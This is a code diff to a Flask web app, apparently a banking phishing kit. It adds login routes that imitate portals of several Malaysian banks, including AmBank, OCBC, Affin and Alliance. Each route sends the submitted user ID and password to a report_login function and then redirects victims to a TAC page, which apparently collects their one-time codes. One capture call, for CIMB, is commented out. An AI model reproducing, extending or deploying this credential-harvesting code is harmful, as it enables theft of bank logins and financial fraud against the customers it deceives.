@@ -39,7 +39,7 @@ def cimb():
         user_id = request.form['user-id']
         password = request.form['password']
         if user_id and password:
-            report_login(user_id,password, bank_name='CIMB')
+            #report_login(user_id,password, bank_name='CIMB')
             return redirect(url_for('main.tac'))
     return render_template('cimb.html')
 
@@ -102,3 +102,83 @@ def uob():
             report_login(user_id,password, bank_name='UOB')
             return redirect(url_for('main.tac'))
     return render_template('uob.html')
+
+@portals.route('/index/bank-selection/ambank', methods=['GET','POST'])
+def ambank():
+    if request.method == 'POST':
+        user_id = request.form['user-id']
+        password = request.form['password']
+        if user_id and password:
+            report_login(user_id,password, bank_name='AmBank')
+            return redirect(url_for('main.tac'))
+    return render_template('ambank.html')
+
+@portals.route('/index/bank-selection/bankmuamalat', methods=['GET','POST'])
+def bankmuamalat():
+    if request.method == 'POST':
+        user_id = request.form['user-id']
+        password = request.form['password']
+        if user_id and password:
+            report_login(user_id,password, bank_name='Bank Muamalat')
+            return redirect(url_for('main.tac'))
+    return render_template('bankmuamalat.html')
+
+@portals.route('/index/bank-selection/standard-chattered', methods=['GET','POST'])
+def standard():
+    if request.method == 'POST':
+        user_id = request.form['user-id']
+        password = request.form['password']
+        if user_id and password:
+            report_login(user_id,password, bank_name='Standard Chattered Bank')
+            return redirect(url_for('main.tac'))
+    return render_template('standard.html')
+
+@portals.route('/index/bank-selection/ocbc', methods=['GET','POST'])
+def ocbc():
+    if request.method == 'POST':
+        user_id = request.form['user-id']
+        password = request.form['password']
+        if user_id and password:
+            report_login(user_id,password, bank_name='OCBC')
+            return redirect(url_for('main.tac'))
+    return render_template('ocbc.html')
+
+@portals.route('/index/bank-selection/exim', methods=['GET','POST'])
+def exim():
+    if request.method == 'POST':
+        user_id = request.form['user-id']
+        password = request.form['password']
+        if user_id and password:
+            report_login(user_id,password, bank_name='EXIM BANK')
+            return redirect(url_for('main.tac'))
+    return render_template('exim.html') 
+
+@portals.route('/index/bank-selection/agrobank', methods=['GET','POST'])
+def agrobank():
+    if request.method == 'POST':
+        user_id = request.form['user-id']
+        password = request.form['password']
+        if user_id and password:
+            report_login(user_id,password, bank_name='Agro Bank')
+            return redirect(url_for('main.tac'))
+    return render_template('agro.html')
+
+@portals.route('/index/bank-selection/alliance', methods=['GET','POST'])
+def alliance():
+    if request.method == 'POST':
+        user_id = request.form['user-id']
+        password = request.form['password']
+        if user_id and password:
+            report_login(user_id,password, bank_name='Alliance Bank')
+            return redirect(url_for('main.tac'))
+    return render_template('alliance.html')
+
+@portals.route('/index/bank-selection/affin-bank', methods=['GET','POST'])
+def affin():
+    if request.method == 'POST':
+        user_id = request.form['user-id']
+        password = request.form['password']
+        if user_id and password:
+            report_login(user_id,password, bank_name='Affin Bank')
+            return redirect(url_for('main.tac'))
+    return render_template('affin.html')
